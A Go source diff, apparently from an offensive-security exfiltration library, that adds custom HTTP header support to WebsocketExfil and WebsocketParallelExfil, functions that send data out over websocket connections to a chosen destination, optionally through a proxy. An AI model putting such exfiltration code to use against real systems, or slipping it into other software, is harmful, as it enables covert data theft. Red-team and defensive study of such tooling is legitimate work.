@@ -459,13 +459,23 @@ func wait(t time.Time, waitEvery, waitFor time.Duration) time.Time {
 
 // WebsocketExfil will return a function pointer to an ExfilFunc that
 // exfils via a websocket connection.
-func WebsocketExfil(dst string, proxy ...string) (ExfilFunc, error) {
+func WebsocketExfil(
+	dst string,
+	headers map[string]string,
+	proxy ...string,
+) (ExfilFunc, error) {
 	var c *ws.Conn
 	var dialer *ws.Dialer
 	var e error
 	var f ExfilFunc
+	var hdrs http.Header = map[string][]string{}
 	var m *sync.Mutex = &sync.Mutex{}
 	var tmp *url.URL
+
+	// Set headers
+	for k, v := range headers {
+		hdrs.Set(k, v)
+	}
 
 	// Skip verify in case user is using self-signed cert
 	dialer = ws.DefaultDialer
@@ -481,7 +491,7 @@ func WebsocketExfil(dst string, proxy ...string) (ExfilFunc, error) {
 	}
 
 	// Connect to Websocket
-	if c, _, e = dialer.Dial(dst, nil); e != nil {
+	if c, _, e = dialer.Dial(dst, hdrs); e != nil {
 		return nil, errors.Newf("failed Websocket connection: %w", e)
 	}
 
@@ -504,12 +514,19 @@ func WebsocketExfil(dst string, proxy ...string) (ExfilFunc, error) {
 // ExfilFunc that exfils via multiple websocket connections.
 func WebsocketParallelExfil(
 	dst string,
+	headers map[string]string,
 	proxy ...string,
 ) (ExfilFunc, error) {
 	var dialer *ws.Dialer
 	var e error
 	var f ExfilFunc
+	var hdrs http.Header = map[string][]string{}
 	var tmp *url.URL
+
+	// Set headers
+	for k, v := range headers {
+		hdrs.Set(k, v)
+	}
 
 	// Skip verify in case user is using self-signed cert
 	dialer = ws.DefaultDialer
@@ -531,7 +548,7 @@ func WebsocketParallelExfil(
 		var e error
 
 		// Connect to Websocket
-		if c, _, e = dialer.Dial(dst, nil); e != nil {
+		if c, _, e = dialer.Dial(dst, hdrs); e != nil {
 			return errors.Newf("failed Websocket connection: %w", e)
 		}
 		defer func() {
